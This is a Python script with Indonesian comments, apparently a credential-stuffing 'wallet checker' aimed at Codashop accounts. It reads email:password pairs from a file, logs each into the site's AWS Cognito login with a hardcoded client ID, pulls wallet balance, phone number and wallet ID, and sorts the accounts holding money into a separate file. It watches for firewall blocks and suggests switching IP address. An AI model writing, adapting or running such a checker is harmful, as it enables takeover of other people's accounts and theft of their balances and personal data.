import requests
import json
import os
from datetime import datetime
import time
import sys

# Global variables untuk file output
output_file = None
balance_file = None

# Mapping kode negara ke nama negara
COUNTRY_CODES = {
    "608": "Filipina",
    "360": "Indonesia", 
    "458": "Malaysia",
    "702": "Singapura",
    "764": "Thailand",
    "704": "Vietnam",
    "096": "Brunei",
    "418": "Laos",
    "104": "Myanmar",
    "116": "Kamboja",
    "76": "Brazil",
    "792": "Turki"
}

# Mapping kode negara ke simbol mata uang
CURRENCY_SYMBOLS = {
    "608": "₱",  # Peso Filipina
    "360": "Rp",  # Rupiah Indonesia
    "458": "RM",  # Ringgit Malaysia
    "702": "S$",  # Dolar Singapura
    "764": "฿",   # Baht Thailand
    "704": "₫",   # Dong Vietnam
    "096": "B$",  # Dolar Brunei
    "418": "₭",   # Kip Laos
    "104": "K",   # Kyat Myanmar
    "116": "៛",    # Riel Kamboja
    "76": "R$",
    "792": "₺"
}

def check_waf_block(error_message):
    """Cek apakah error message mengandung indikasi WAF block"""
    waf_indicators = [
        "WAF block",
        "ForbiddenException: Request not allowed due to WAF block",
        "WAFBlock",
        "Request blocked by WAF",
        "Security violation detected"
    ]
    
    return any(indicator in error_message for indicator in waf_indicators)

def handle_waf_block(error_message, account_number, total_accounts):
    """Handle WAF block dan hentikan aplikasi"""
    print(f"\n🚨 CRITICAL: WAF BLOCK DETECTED!")
    print(f"   ⚠️  Account: {account_number}/{total_accounts}")
    print(f"   ❌ Error: {error_message}")
    print(f"   🛑 Aplikasi dihentikan untuk mencegah blokir lebih lanjut!")
    print(f"   💡 Solusi: Tunggu beberapa waktu atau ganti IP address")
    
    # Simpan status WAF block ke file
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("waf_block_log.txt", "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] WAF BLOCK DETECTED\n")
            f.write(f"Account: {account_number}/{total_accounts}\n")
            f.write(f"Error: {error_message}\n")
            f.write("=" * 50 + "\n\n")
    except:
        pass
    
    input("Press Enter to exit...")
    sys.exit(1)  # Keluar dengan error code 1

def get_country_name(country_code):
    """Mengubah kode negara menjadi nama negara"""
    return COUNTRY_CODES.get(str(country_code), f"Unknown ({country_code})")

def get_currency_symbol(country_code):
    """Mendapatkan simbol mata uang berdasarkan kode negara"""
    return CURRENCY_SYMBOLS.get(str(country_code), "")

def format_balance(balance, country_code):
    """Format balance dengan simbol mata uang"""
    if balance == "N/A" or balance is None:
        return "N/A"
    
    symbol = get_currency_symbol(country_code)
    return f"{symbol}{balance}"

def setup_output_files():
    """Setup file output dengan timestamp"""
    global output_file, balance_file
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    output_file = f"hasil_wallet_live_{timestamp}.txt"
    balance_file = f"hasil_balance_{timestamp}.txt"
    
    # Buat header untuk file utama
    with open(output_file, "w", encoding="utf-8") as f:
        f.write("HASIL CEK WALLET LIVE - " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
        f.write("=" * 80 + "\n\n")
    
    # Buat header untuk file balance
    with open(balance_file, "w", encoding="utf-8") as f:
        f.write("AKUN DENGAN BALANCE - " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
        f.write("=" * 80 + "\n\n")
    
    print(f"📁 File output: {output_file}")
    print(f"💰 File balance: {balance_file}")

def save_result_live(result):
    """Menyimpan hasil langsung ke file"""
    global output_file, balance_file
    
    try:
        # Dapatkan nama negara dan format balance
        country_name = get_country_name(result['countryCode'])
        formatted_balance = format_balance(result['balanceAmount'], result['countryCode'])
        
        # Simpan ke file utama
        with open(output_file, "a", encoding="utf-8") as f:
            f.write(f"📧 Email: {result['email']}\n")
            f.write(f"📊 Status: {result['status']}\n")
            f.write(f"💵 Balance: {formatted_balance}\n")
            f.write(f"📱 Mobile: {result['mobile']}\n")
            f.write(f"🌍 Country Code: {result['countryCode']}\n")
            f.write(f"🏴 Country Name: {country_name}\n")
            
            if result['status'] == "Sukses":
                f.write(f"🆔 Wallet ID: {result.get('walletId', 'N/A')}\n")
                f.write(f"💰 Total Spent: {result.get('totalSpent', 'N/A')}\n")
            else:
                f.write(f"❌ Error: {result.get('error', 'N/A')}\n")
            
            f.write("-" * 50 + "\n\n")
        
        # Simpan ke file balance jika memiliki balance > 0
        if (result['status'] == "Sukses" and 
            result['balanceAmount'] != "N/A" and 
            result['balanceAmount'] > 0):
            
            with open(balance_file, "a", encoding="utf-8") as f:
                f.write(f"📧 Email: {result['email']}\n")
                f.write(f"💵 Balance: {formatted_balance}\n")
                f.write(f"📱 Mobile: {result['mobile']}\n")
                f.write(f"🌍 Country Code: {result['countryCode']}\n")
                f.write(f"🏴 Country Name: {country_name}\n")
                f.write(f"🆔 Wallet ID: {result.get('walletId', 'N/A')}\n")
                f.write(f"💰 Total Spent: {result.get('totalSpent', 'N/A')}\n")
                f.write("-" * 40 + "\n\n")
            
            return True  # Mengindikasikan ada balance
        
        return False
        
    except Exception as e:
        print(f"❌ Error menyimpan hasil: {e}")
        return False

def login_cognito(email, password):
    """Login ke Cognito dan mendapatkan token"""
    url = "https://cognito-idp.ap-southeast-1.amazonaws.com/"
    
    headers = {
        "content-type": "application/x-amz-json-1.1",
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    data = {
        "AuthFlow": "USER_PASSWORD_AUTH",
        "ClientId": "437f3u0sfh7h0av5rlrrjdtmsb",
        "AuthParameters": {
            "USERNAME": email,
            "PASSWORD": password
        },
        "ClientMetadata": {
            "country_code": "id",
            "country_name": "Indonesia",
            "lang_code": "id"
        }
    }
    
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if "AuthenticationResult" in data and "IdToken" in data["AuthenticationResult"]:
                id_token = data["AuthenticationResult"]["IdToken"]
                return {"success": True, "token": id_token, "message": "Login berhasil"}
            else:
                return {"success": False, "message": "Token tidak ditemukan dalam response"}
        else:
            error_msg = response.text
            try:
                error_json = response.json()
                if "__type" in error_json:
                    error_msg = f"{error_json['__type']}: {error_json.get('message', 'Unknown error')}"
            except:
                pass
            return {"success": False, "message": f"Error Login: {error_msg}"}
            
    except Exception as e:
        return {"success": False, "message": f"Error: {e}"}

def check_wallet(id_token):
    """Cek informasi wallet menggunakan token"""
    url = "https://wallet-api.codacash.com/user/wallet"
    
    headers = {
        "accept": "application/json, text/plain, */*",
        "authorization": id_token,
        "origin": "https://www.codashop.com",
        "referer": "https://www.codashop.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-country-code": "608",
        "x-merchant-id": "ea3ceab4-6c45-5f28-b547-cd5dd4bb05b2"
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return {"success": True, "data": data}
        else:
            return {"success": False, "message": f"Error Wallet: {response.status_code} - {response.text}"}
            
    except Exception as e:
        return {"success": False, "message": f"Error: {e}"}

def process_account(email, password, account_number, total_accounts):
    """Proses satu akun dan langsung simpan hasil"""
    print(f"\n[{account_number}/{total_accounts}] 🔐 Memproses: {email}")
    
    # Login ke Cognito
    login_result = login_cognito(email, password)
    
    if not login_result["success"]:
        error_message = login_result['message']
        print(f"   ❌ Gagal login: {error_message}")
        
        # Cek jika ini adalah WAF block
        if check_waf_block(error_message):
            handle_waf_block(error_message, account_number, total_accounts)
        
        result = {
            "email": email,
            "status": "Gagal Login",
            "balanceAmount": "N/A",
            "mobile": "N/A",
            "countryCode": "N/A",
            "error": error_message
        }
        save_result_live(result)
        return result
    
    print(f"   ✅ Login berhasil, mengecek wallet...")
    
    # Cek wallet
    wallet_result = check_wallet(login_result["token"])
    
    if not wallet_result["success"]:
        error_message = wallet_result['message']
        print(f"   ❌ Gagal cek wallet: {error_message}")
        
        # Cek jika ini adalah WAF block (wallet API juga bisa kena WAF)
        if check_waf_block(error_message):
            handle_waf_block(error_message, account_number, total_accounts)
        
        result = {
            "email": email,
            "status": "Gagal Cek Wallet",
            "balanceAmount": "N/A",
            "mobile": "N/A",
            "countryCode": "N/A",
            "error": error_message
        }
        save_result_live(result)
        return result
    
    # Extract data wallet
    wallet_data = wallet_result["data"]
    
    if wallet_data and isinstance(wallet_data, dict):
        if "resultCode" in wallet_data and wallet_data["resultCode"] != 0:
            error_msg = wallet_data.get("resultMessage", "Unknown error")
            print(f"   ❌ Error dari API: {error_msg}")
            result = {
                "email": email,
                "status": "API Error",
                "balanceAmount": "N/A",
                "mobile": "N/A",
                "countryCode": "N/A",
                "error": error_msg
            }
            save_result_live(result)
            return result
        
        if "data" in wallet_data and wallet_data["data"] is not None:
            data = wallet_data["data"]
            balance = data.get('balanceAmount', 'N/A')
            mobile = data.get('mobile', 'N/A')
            country_code = data.get('countryCode', 'N/A')
            
            # Dapatkan nama negara dan format balance untuk output console
            country_name = get_country_name(country_code)
            formatted_balance = format_balance(balance, country_code)
            
            print(f"   ✅ Berhasil - Balance: {formatted_balance}, Mobile: {mobile}, Negara: {country_name}")
            
            result = {
                "email": email,
                "status": "Sukses",
                "balanceAmount": balance,
                "mobile": mobile,
                "countryCode": country_code,
                "walletId": data.get('walletId', 'N/A'),
                "userId": data.get('userId', 'N/A'),
                "totalSpent": data.get('totalSpent', 'N/A'),
                "error": None
            }
            
            # Simpan hasil dan cek jika ada balance
            has_balance = save_result_live(result)
            if has_balance:
                print(f"   💰 AKUN INI MEMILIKI BALANCE! Disimpan di {balance_file}")
            
            return result
        else:
            print(f"   ⚠️ Data wallet kosong")
            result = {
                "email": email,
                "status": "Data Kosong",
                "balanceAmount": "N/A",
                "mobile": "N/A",
                "countryCode": "N/A",
                "error": "Data wallet kosong"
            }
            save_result_live(result)
            return result
    else:
        print(f"   ❌ Format response wallet tidak valid")
        result = {
            "email": email,
            "status": "Format Invalid",
            "balanceAmount": "N/A",
            "mobile": "N/A",
            "countryCode": "N/A",
            "error": "Format response tidak valid"
        }
        save_result_live(result)
        return result

def read_accounts_from_file(filename="akun.txt"):
    """Membaca akun dari file"""
    accounts = []
    try:
        with open(filename, "r", encoding="utf-8") as file:
            for line_num, line in enumerate(file, 1):
                line = line.strip()
                if line and ":" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        email, password = parts
                        accounts.append({"email": email.strip(), "password": password.strip()})
                    else:
                        print(f"⚠️ Format salah di baris {line_num}: {line}")
                elif line:
                    print(f"⚠️ Format salah di baris {line_num}: {line}")
        
        print(f"📖 Membaca {len(accounts)} akun dari {filename}")
        return accounts
    except FileNotFoundError:
        print(f"❌ File {filename} tidak ditemukan!")
        return []
    except Exception as e:
        print(f"❌ Error membaca file: {e}")
        return []

def update_summary_file(success_count, failed_count, total_count):
    """Update summary di file utama"""
    global output_file
    
    try:
        # Baca semua konten file
        with open(output_file, "r", encoding="utf-8") as f:
            content = f.read()
        
        # Cari dan replace summary
        if "📈 SUMMARY:" in content:
            # Hapus summary lama
            lines = content.split('\n')
            new_lines = []
            skip = False
            for line in lines:
                if line.startswith("📈 SUMMARY:"):
                    skip = True
                elif skip and line.strip() == "":
                    skip = False
                    continue
                elif not skip:
                    new_lines.append(line)
            
            content = '\n'.join(new_lines)
        
        # Tambahkan summary baru
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(content)
            f.write(f"\n📈 SUMMARY (Update: {datetime.now().strftime('%H:%M:%S')}):\n")
            f.write(f"✅ Sukses: {success_count}\n")
            f.write(f"❌ Gagal: {failed_count}\n")
            f.write(f"📊 Total: {total_count}\n")
            f.write(f"🎯 Progress: {success_count + failed_count}/{total_count}\n")
            
    except Exception as e:
        print(f"❌ Error update summary: {e}")

def main():
    """Program utama"""
    print("🚀 MULTI-ACCOUNT WALLET CHECKER (REAL-TIME)")
    print("=" * 50)
    print("⚠️  FITUR KEAMANAN: Aplikasi akan berhenti otomatis jika terdeteksi WAF block")
    print("=" * 50)
    
    # Setup file output
    setup_output_files()
    
    # Baca akun dari file
    accounts = read_accounts_from_file("akun.txt")
    
    if not accounts:
        print("❌ Tidak ada akun yang dapat diproses!")
        input("Press Enter to exit...")
        return
    
    results = []
    success_count = 0
    failed_count = 0
    balance_count = 0
    
    print(f"\n🎯 Memulai proses {len(accounts)} akun...")
    print(f"💡 Hasil akan disimpan langsung ke file:")
    print(f"   📄 Semua hasil: {output_file}")
    print(f"   💰 Akun balance: {balance_file}")
    
    # Proses setiap akun
    for i, account in enumerate(accounts, 1):
        try:
            result = process_account(
                account["email"], 
                account["password"], 
                i, 
                len(accounts)
            )
            results.append(result)
            
            # Update counters
            if result['status'] == "Sukses":
                success_count += 1
                if (result['balanceAmount'] != "N/A" and 
                    result['balanceAmount'] > 0):
                    balance_count += 1
            else:
                failed_count += 1
            
            # Update summary di file setiap 5 akun atau di akhir
            if i % 5 == 0 or i == len(accounts):
                update_summary_file(success_count, failed_count, len(accounts))
                print(f"📊 Progress: {i}/{len(accounts)} | ✅ {success_count} | ❌ {failed_count} | 💰 {balance_count}")
            
            # Delay kecil antara akun
            if i < len(accounts):
                time.sleep(1)
                
        except SystemExit:
            # Jika ada SystemExit dari handle_waf_block, biarkan keluar
            raise
        except Exception as e:
            print(f"   💥 Error tak terduga: {e}")
            failed_count += 1
            result = {
                "email": account["email"],
                "status": "Error System",
                "balanceAmount": "N/A",
                "mobile": "N/A",
                "countryCode": "N/A",
                "error": str(e)
            }
            results.append(result)
            save_result_live(result)
    
    # Final summary
    print(f"\n📊 FINAL SUMMARY:")
    print(f"✅ Sukses: {success_count}")
    print(f"❌ Gagal: {failed_count}")
    print(f"💰 Balance ditemukan: {balance_count}")
    print(f"📊 Total: {len(accounts)}")
    print(f"📄 File semua hasil: {output_file}")
    print(f"💰 File akun balance: {balance_file}")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()